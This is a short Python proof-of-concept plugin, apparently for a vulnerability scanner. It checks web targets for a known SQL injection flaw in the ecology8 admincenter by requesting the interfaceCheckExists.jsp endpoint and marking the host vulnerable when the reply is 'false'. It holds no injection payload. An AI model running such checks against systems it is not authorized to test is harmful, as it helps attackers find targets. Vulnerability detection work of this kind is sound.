#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'ecology8 admincenter sql inject'
        self.keyword = ['ecology8', 'sql inject']
        self.info = 'ecology8 admincenter sql inject'
        self.type = VUL_TYPE.SQL
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    url = path +"admincenter/interfaces/interfaceCheckExists.jsp?className="

                    async with session.get(url=url) as res:
                        if res!=None:
                            text = await res.text()
                            if 'false' == text.replace('\r','').replace('\n','').replace(' ',''):
                                self.flag = 1
                                self.req.append({"url": url})
                                self.res.append({"info": url, "key": "ecology8 inject"})
                                return